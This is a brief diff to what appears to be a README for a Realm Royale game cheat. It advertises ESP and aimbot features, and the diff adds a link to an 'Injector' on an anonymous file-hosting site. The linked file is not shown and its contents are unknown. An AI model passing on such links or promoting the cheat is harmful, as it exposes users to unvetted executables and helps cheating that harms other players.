@@ -1,5 +1,7 @@
 # Realm Royale Cheat
 
+# İnjector : https://fastupload.io/gZOBgSVKO0ugn2K/file
+
 # Features
 
 Esp , Aimbot , Misc..
